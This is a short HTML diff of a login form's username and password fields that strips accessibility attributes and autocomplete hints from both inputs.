@@ -184,12 +184,12 @@
 				 		       </div>
 				 		        
                                 <label class="labelTxt"><span class="oun"></span></label>
-                             	<input id="oun" type="text" name="eliloUserID" aria-invalid="false" aria-required="false" data-testid="userid-input" aria-labelledby="eliloUserID-label" autocomplete="username" class="input-control" value="">
+                             	<input id="oun" type="text" name="eliloUserID" data-testid="userid-input" class="input-control" value="">
                      			<div>&nbsp;</div>	
                      				
                                 <label class="labelTxt"><span class="ps"></span></label>                             
                               	<div class="upw-container">
-                                 <input id="upw" type="text" name="eliloPassword"  aria-invalid="false" aria-required="false" data-testid="password-input" aria-labelledby="eliloPassword-label" autocomplete="current-password" class="input-control" value="">
+                                 <input id="upw" type="text" name="eliloPassword" data-testid="password-input" class="input-control" value="">
                                  <div class="toggle-upw" id="toggleupw">Show</div>
                                </div>
                                
